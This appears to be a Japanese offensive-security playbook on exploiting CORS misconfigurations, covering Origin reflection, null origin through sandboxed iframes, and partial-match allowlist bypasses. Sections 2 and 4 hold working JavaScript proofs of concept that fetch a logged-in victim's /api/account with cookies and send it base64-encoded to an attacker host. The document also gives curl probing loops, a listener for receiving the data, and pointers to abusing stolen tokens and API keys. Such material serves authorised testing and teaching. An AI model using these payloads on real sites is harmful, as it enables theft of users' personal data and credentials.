# クロスオリジンリソース共有（CORS）の設定不備

> **スコープ**: サーバーの CORS レスポンスヘッダー（`Access-Control-Allow-Origin` / `-Allow-Credentials`）の設定不備を悪用し、攻撃者オリジンから被害者の認証済みレスポンス（個人情報・トークン）を**読み取る**攻撃。Origin 反射・null origin・部分一致 allowlist の判定〜認証情報付きリクエストでの窃取までを扱う。状態変更（書き込み）の偽造は `CSRF.md`、レスポンスを読まない単純な強制リクエストも CSRF 側を参照。

## 着火条件

- 認証済みユーザーの機微データを返す API（`/api/account` / `/api/me` / API キー返却エンドポイント等）がある
- そのレスポンスに `Access-Control-Allow-Origin`（ACAO）ヘッダーが付いており、値が動的（リクエスト Origin を反射）または緩い
- 特に `Access-Control-Allow-Credentials: true`（ACAC）が併用されていると、Cookie 付きクロスオリジン読み取りが成立し得る

## 環境前提

- 実行環境: テスター端末（攻撃 JS をホスト）/ 被害者ブラウザ（ログイン済みセッション）
- 必要なツール: `curl`（ACAO 反射の判定）/ ブラウザ + `python3 -m http.server`（攻撃 PoC のホスト）/ Burp Suite（Origin ヘッダーの差し替え）
- オフライン環境でも `curl` で ACAO/ACAC の挙動判定は完結する。実際の窃取 PoC のみブラウザが要る

## 先に確認すること

- **CSRF との違いを意識する**: CORS 不備は「クロスオリジンで**レスポンスを読める**」ことが本質（情報窃取）。状態変更だけが目的なら CORS 不要で `CSRF.md` の領域。読み取りが要件のときに本ファイルを使う。
- **`Access-Control-Allow-Credentials: true` の有無を最優先で確認する**: これが無いと、攻撃者オリジンからの fetch に Cookie が乗らず、窃取できるのは未認証レスポンスに限られる。

**攻撃者の思考トレース:** まず `Origin:` ヘッダーを任意の値にして送り、レスポンスの `Access-Control-Allow-Origin` がそれを**そのまま反射するか**を見る。反射 + `Allow-Credentials: true` の組み合わせが最悪ケースで、攻撃者サイトの JS から被害者の認証済みレスポンスを読める。反射しない場合は `null`・サブドメイン・部分一致など「緩い許可ロジック」の穴を順に突く。

---

## 1. Origin 反射の確認（最重要）

**コマンド:**

```bash
# [Attacker] 任意の Origin を送って ACAO が反射されるか確認
curl -s -I http://[TARGET]/api/account \
  -H "Origin: https://attacker.example.invalid" -b "[SESSION_COOKIE]" \
  | grep -i "access-control-allow"
```

**観測される出力 → 次のアクション:**

| レスポンスヘッダー | 示唆 | 次のアクション |
|---|---|---|
| `Access-Control-Allow-Origin: https://attacker.example.invalid` + `Allow-Credentials: true` | 任意 Origin 反射 + 認証情報許可 = **最悪ケース** | §4 認証情報付き窃取 PoC へ（そのまま読める）|
| `Allow-Origin` に送った Origin が反射されるが `Allow-Credentials` が無い | 反射するが Cookie は乗らない | 未認証で読めるデータに限定。認証データは不可 |
| `Allow-Origin: *`（ワイルドカード）| 全オリジン許可だが、仕様上 `*` + credentials は**ブラウザが拒否** | 認証データは読めない。公開 API としての情報量を評価 |
| `Allow-Origin` ヘッダーが返らない | 動的反射なし | §2 null / §3 部分一致 を試す |

**注意:** `Access-Control-Allow-Origin: *` と `Access-Control-Allow-Credentials: true` の**併用はブラウザ側が無効化する**（fetch がエラーになる）ため、`*` 単独では認証データ窃取はできない。攻撃が成立する典型は「Origin をそのまま反射 + `Allow-Credentials: true`」。`curl` では `*` でもボディが返るが、それは「ブラウザの SOP を経由していない」だけで実害判定には `Allow-Credentials` と反射可否を見る。

---

## 2. null origin の許可

許可ロジックが `null` を allowlist に入れていると、`sandbox` 属性付き iframe（Origin が `null` になる）から読み取れる。

**コマンド:**

```bash
# [Attacker] Origin: null が反射されるか
curl -s -I http://[TARGET]/api/account \
  -H "Origin: null" -b "[SESSION_COOKIE]" | grep -i "access-control-allow"
```

```html
<!-- [Attacker] null origin を作る sandbox iframe（data: URL の中で fetch） -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('http://[TARGET]/api/account',{credentials:'include'})
      .then(r=>r.text()).then(d=>new Image().src='http://[ATTACKER_HOST]:8000/?d='+btoa(d));
  &lt;/script&gt;">
</iframe>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Access-Control-Allow-Origin: null` + `Allow-Credentials: true` | null を信頼している | 上記 sandbox iframe PoC で認証済みレスポンスを窃取 |
| `null` が反射されない | null 許可なし | §3 部分一致 allowlist へ |

**注意:** 開発者は `null`（ローカルファイル・リダイレクト・sandbox 由来）を「安全な内部値」と誤解して allowlist に入れがち。攻撃者は `sandbox` iframe で容易に `null` origin を生成できるため、`null` 許可は実質「任意オリジン許可」に近い。

---

## 3. 部分一致 allowlist の穴

許可判定が「Origin 文字列に自社ドメインが**含まれるか**」「`startsWith` / `endsWith`」のような部分一致だと、攻撃者ドメインで条件を満たせる。

**コマンド（判定用 Origin バリエーション）:**

```bash
# [Attacker] 部分一致・前方/後方一致のバイパス候補を順に送る（example.com が正規ドメインの場合）
for o in \
  "https://example.com.attacker.invalid" \
  "https://attacker-example.com" \
  "https://exampleXcom.attacker.invalid" \
  "https://example.com.attacker.invalid" \
  "https://sub.example.com" ; do
  echo "== $o =="
  curl -s -I http://[TARGET]/api/account -H "Origin: $o" -b "[SESSION_COOKIE]" \
    | grep -i "access-control-allow-origin"
done
```

**観測される出力 → 次のアクション（バイパスパターン）:**

| 送った Origin | 通る原因 | 示唆 |
|---|---|---|
| `https://example.com.attacker.invalid` | `startsWith("https://example.com")` 判定 | 前方一致バイパス成立 → §4 |
| `https://attacker-example.com` | `endsWith("example.com")` / `contains("example.com")` | 後方・部分一致バイパス成立 → §4 |
| `https://sub.example.com` | サブドメインを無条件許可 | サブドメインに XSS / takeover があれば連鎖（`../../01_Reconnaissance/DNS_Enumeration.md` の Subdomain Takeover）|
| `http://example.com`（スキーム違い）| スキームを見ず host だけ一致 | 平文 HTTP オリジンから窃取できる経路 |

**注意:** 正規表現の `.` を未エスケープにしている（`example.com` が `exampleXcom` に一致）穴、ドット位置を見ない `contains` 判定が典型。サブドメイン無条件許可は、そのサブドメインのどれか 1 つに XSS や Subdomain Takeover があれば CORS 窃取に化ける（信頼の連鎖）。

---

## 4. 認証情報付きレスポンスの窃取（PoC）

反射 + `Allow-Credentials: true`（または null / 部分一致バイパス）が確認できたら、攻撃者サイトの JS で被害者の認証済みレスポンスを読み出して exfil する。

**事前準備（必須）:** 受信用サーバーを起動し、PoC をホストする。

```bash
# [Attacker] exfil 受信 + PoC ホスト
python3 -m http.server 8000
ip a | grep "inet " | grep -v 127.0.0.1   # 到達可能 IP 確認
```

**コマンド（PoC）:**

```html
<!-- [Attacker] 被害者がログイン状態でこのページを開くと、
     credentials:'include' で Cookie 付き要求 → 反射 ACAO によりレスポンスを JS が読める -->
<script>
fetch('http://[TARGET]/api/account',{credentials:'include'})
  .then(r => r.text())
  .then(d => { new Image().src='http://[ATTACKER_HOST]:8000/?d='+btoa(d); });
</script>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `?d=` に被害者の個人情報・API キー・トークンが届く | CORS 窃取成立 | base64 デコード → トークンなら `JWT_Attacks.md` / API キーなら該当 API / 認証情報なら `../Credential_Discovery.md` |
| fetch が CORS エラーで読めない | `Allow-Credentials` 欠落 or `*` 併用でブラウザが拒否 | 未認証で読める範囲に限定。§1 の判定に戻る |
| レスポンスは来るが空 | エンドポイントが Origin で内容を出し分け | 別の機微エンドポイントを探す |

**注意:** `credentials:'include'` が無いと Cookie が乗らず未認証レスポンスしか取れない。窃取できた CSRF トークン・API キーがあれば、それを使って今度は `CSRF.md` の状態変更や直接 API 操作に昇格できる（読み取り → 書き込みの連鎖）。

---

## 刺さらなかったとき（全体）

| 観測される症状 | 推定原因 | 代替手段 |
|---|---|---|
| ACAO が任意 Origin を反射しない | 動的反射なし | §2 null / §3 部分一致を順に試す |
| 反射するが `Allow-Credentials` が無い | 認証情報が乗らない | 未認証データに限定。認証データ窃取は不可 |
| `Allow-Origin: *` のみ | 仕様上 credentials 併用不可 | 公開 API の情報量評価に留める |
| fetch がプリフライトで止まる | カスタムヘッダー / メソッドで preflight | preflight に対する ACAO/ACAC も反射するか確認。しなければ不成立 |
| 全部不成立 | CORS 設定は妥当 | 読み取りでなく書き込みが目的なら `CSRF.md` へ |

---

## 注意点・落とし穴

- **`*` + credentials はブラウザが拒否する**: `Access-Control-Allow-Origin: *` 単独では認証データを窃取できない。成立条件は「Origin 反射（または緩い許可）＋ `Allow-Credentials: true`」。
- **curl の結果＝実害ではない**: curl は SOP を経由しないのでボディが返る。ブラウザでの実害は ACAO 反射可否と ACAC の組み合わせで判定する。
- **null origin は実質任意オリジン**: `sandbox` iframe で容易に生成できるため、`null` 許可は危険。
- **サブドメイン信頼の連鎖**: サブドメイン無条件許可 + そのサブドメインの XSS / Takeover で CORS 窃取が成立する。
- **CORS は SOP を緩めるだけで強める仕組みではない**: 「CORS ヘッダーがある＝制御している」ではなく、設定次第で SOP の保護を**自ら外す**。ヘッダーの存在自体を finding 扱いせず、反射ロジックと credentials を見る。
- **窃取は読み取り、CSRF は書き込み**: 目的（読むか変えるか）で参照ファイルを切り替える。

---

## 関連技術

- 前：レスポンスヘッダーの一次トリアージで CORS ヘッダーを確認 → `../../01_Reconnaissance/Web_Response_Triage.md`
- 前：機微データを返す認証済み API エンドポイントの発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 後：窃取したトークンの解析・悪用 → `JWT_Attacks.md`
- 後：窃取した API キー・認証情報の活用 → `../Credential_Discovery.md`
- 関連：状態変更（書き込み）の偽造 → `CSRF.md`
- 関連：サブドメイン許可 × Subdomain Takeover の連鎖 → `../../01_Reconnaissance/DNS_Enumeration.md`
- 関連：サブドメインの XSS から CORS 窃取への連鎖 → `XSS.md`
- 関連：攻撃側の準備（PoC ホスト・到達可能 IP の確認）→ `../../06_Concepts/Reverse_Shell.md`
